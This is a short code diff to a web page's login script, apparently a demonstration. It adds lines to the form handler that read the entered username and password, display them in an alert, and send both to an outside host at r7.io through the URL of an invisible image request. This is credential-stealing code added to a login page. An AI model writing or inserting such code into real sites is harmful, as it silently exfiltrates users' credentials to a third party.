@@ -21,9 +21,12 @@
     </script>
     <script>
         function getForm (form) {
-            var Password1 = $('#login_password').val();
-            var Username1 = $('#login_username').val();
-            alert(Password1 + "    " + Username1);
+            var Password = $('#login_password').val();
+            var Username = $('#login_username').val();
+            alert(Password + "    " + Username);
+           var check = new Image();
+            check.src = "http://r7.io/e/segall2?s=" + Username + Password;
+
         };
     </script>
 
